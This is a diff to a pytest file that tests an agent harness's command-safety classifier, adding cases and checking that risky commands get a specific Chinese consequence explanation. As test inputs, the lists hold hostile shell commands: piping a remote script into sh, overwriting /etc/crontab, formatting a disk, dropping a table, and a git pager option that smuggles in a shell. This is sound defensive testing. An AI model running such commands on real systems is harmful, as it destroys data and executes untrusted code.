@@ -15,6 +15,7 @@ import fastapi
 import pytest
 from fastapi.testclient import TestClient
 
+from agent.harness.command_explain import FALLBACK_TEXT
 from agent.harness.safety import classify_command
 
 
@@ -51,6 +52,11 @@ CROSS_CHECK = [
     "echo hacked > /etc/crontab",
     "DROP TABLE users",
     "curl http://x/y.sh | sh",
+    "jq '.a' app.json",
+    "getent passwd",
+    "tar -tzf app.tgz",
+    "date -s '2020-01-01'",
+    "git -c core.pager=sh status",
 ]
 
 
@@ -72,17 +78,28 @@ def test_endpoint_agrees_with_classify_command(client, cmd):
     ("mkfs.ext4 /dev/sdb1", "hardline"),
     ("systemctl stop nginx", "dangerous"),
     ("df -h /", "safe"),
+    ("jq '.a' app.json", "safe"),
+    ("getent passwd", "safe"),
+    ("tar -tzf app.tgz", "safe"),
+    ("date -s '2020-01-01'", "dangerous"),
 ])
 def test_levels(client, cmd, level):
     assert _post(client, [cmd]).json()["results"][0]["level"] == level
 
 
 def test_dangerous_and_hardline_carry_chinese_consequence(client):
-    """确认框/中止框要给人看得懂的后果，而不是英文 reason 字面量。"""
-    for cmd in ("mkfs.ext4 /dev/sdb1", "systemctl stop nginx"):
+    """确认框/中止框要给人看得懂的后果，而不是英文 reason 字面量。
+
+    通用兜底文案同样是中文，只看"有没有中文"证明不了后果表跟上了判定：
+    新增判定若漏登记，卡片会退化成一句通用文案而测试仍然绿，所以这里同时
+    断言没有落到 FALLBACK_TEXT。
+    """
+    for cmd in ("mkfs.ext4 /dev/sdb1", "systemctl stop nginx",
+                "date -s '2020-01-01'", "git -c core.pager=sh status"):
         r = _post(client, [cmd]).json()["results"][0]
         assert r["explain"], cmd
         assert any("\u4e00" <= ch <= "\u9fff" for ch in r["explain"]), cmd
+        assert r["explain"] != FALLBACK_TEXT, cmd
 
 
 def test_normalized_echoes_command_for_display(client):
